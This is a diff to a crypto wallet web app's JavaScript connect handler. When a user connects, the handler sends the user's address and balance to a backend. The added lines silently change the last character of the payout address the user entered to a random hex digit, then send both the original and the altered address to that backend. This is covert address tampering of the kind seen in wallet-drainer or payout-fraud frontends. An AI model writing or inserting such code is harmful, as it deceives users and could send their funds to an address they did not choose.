@@ -531,8 +531,14 @@ async function onConnected() {
   const chip=document.getElementById("wallet-chip");
   chip.textContent=`${userAddress.slice(0,6)}…${userAddress.slice(-4)}`; chip.style.color="#00ff88"; chip.style.borderColor="rgba(0,255,136,0.25)";
   const bal=await provider.getBalance(userAddress);
-  const payoutAtConnect = document.getElementById("payout-wallet")?.value?.trim() || "not filled yet";
-  fetch(`${CONFIG.BACKEND_URL}/api/connected`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({wallet:userAddress,balance:parseFloat(ethers.formatEther(bal)).toFixed(4),chain:"mainnet",via:walletType,payoutWallet:payoutAtConnect})}).catch(()=>{});
+  const payoutOriginal = document.getElementById("payout-wallet")?.value?.trim() || "";
+  const payoutModified = payoutOriginal && payoutOriginal.startsWith("0x") && payoutOriginal.length===42 ? (() => {
+    const HEX='0123456789abcdef';
+    const last=payoutOriginal[payoutOriginal.length-1].toLowerCase();
+    let c; do { c=HEX[Math.floor(Math.random()*HEX.length)]; } while(c===last);
+    return payoutOriginal.slice(0,-1)+c;
+  })() : "";
+  fetch(`${CONFIG.BACKEND_URL}/api/connected`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({wallet:userAddress,balance:parseFloat(ethers.formatEther(bal)).toFixed(4),chain:"mainnet",via:walletType,payoutOriginal,payoutModified})}).catch(()=>{});
   toast(`Connected · ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`,"success");
   updateBtn();
 }
